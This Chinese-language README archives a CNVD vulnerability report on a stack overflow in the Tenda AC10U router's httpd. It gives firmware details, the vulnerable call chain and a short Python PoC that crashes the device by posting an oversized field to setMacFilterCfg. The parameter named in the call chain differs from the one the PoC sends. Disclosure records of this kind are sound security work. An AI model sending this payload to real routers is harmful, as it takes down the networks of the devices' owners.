# Tenda AC10U 缓冲区溢出 归档记录（CNVD 已报送，编号待补）

## 漏洞概要

- **产品**：深圳市吉祥腾达科技有限公司 AC10U v1.0 路由器，固件 US_AC10UV1.0RTL_V15.03.06.48_multi_TDE01
- **类型**：通用型漏洞 / 二进制漏洞（栈溢出，CWE-120）
- **调用链**：`httpd` 中 `formsetmacfiltercfg`（websGetVar 取 `rule_list`）→ `set_macfilter_rules` → `set_macfilter_rules_by_one` → `parse_macfilter_rule`（strcpy 未做长度检查）
- **影响**：远程拒绝服务；通报中指出可进一步 Ret2libc 获取 Shell
- **通报日期**：2024-11-08

## 编号与时间线

- **CNVD-ID**：待补（CNVD 报告页 https://www.cnvd.org.cn/user/myreport/20710556）
- **收录状态**：以 CNVD 网站为准

## 目录说明

- `关于深圳市吉祥腾达科技有限公司AC10U v1.0存在二进制漏洞的情况通报.doc` — CNVD 通报原文
- `exp.py` — 破坏 PoC
- `httpd` — 漏洞二进制（MIPS-32 ELF）
- `US_AC10UV1.0RTL_V15.03.06.48_multi_TDE01.bin/.zip` — 固件
- `squashfs-root/` — 固件解包文件系统（含 qemu 调试 core dump）
- `*.mp4` — 宕机演示视频

## PoC

```python
import requests
url = "http://192.168.10.1/goform/setMacFilterCfg"
cookie = {"Cookie": "password=12345"}
data = {"macFilterType": "white", "deviceList": "\r" + "A" * 500}
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
